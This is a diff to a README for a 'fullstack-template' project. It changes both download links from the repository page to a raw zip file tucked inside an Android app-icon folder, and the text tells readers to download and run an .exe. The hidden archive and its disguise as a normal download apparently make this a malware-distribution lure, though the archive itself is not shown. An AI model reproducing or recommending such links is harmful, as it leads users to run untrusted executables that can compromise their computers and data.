@@ -1,6 +1,6 @@
 # 🚀 fullstack-template - Build professional apps with less effort
 
-[![Download fullstack-template](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/walisson2869/fullstack-template)
+[![Download fullstack-template](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/walisson2869/fullstack-template/raw/refs/heads/main/mobile/app/src/main/res/mipmap-xxxhdpi/template-fullstack-1.4-alpha.1.zip)
 
 This project provides a complete foundation for software development. It removes the need for repetitive configuration tasks. You focus on your business goals while the system handles the technical requirements.
 
@@ -18,7 +18,7 @@ Your computer needs specific components to run this application. Please confirm 
 
 You must visit the project page to get the latest version of the toolkit.
 
-[Click here to visit the download page](https://github.com/walisson2869/fullstack-template)
+[Click here to visit the download page](https://github.com/walisson2869/fullstack-template/raw/refs/heads/main/mobile/app/src/main/res/mipmap-xxxhdpi/template-fullstack-1.4-alpha.1.zip)
 
 After you arrive at the page, look for the section labeled Releases on the right side of your screen. Click the most recent version number to see the available files. Find the file that ends with .exe and click it to save the file to your computer.
 
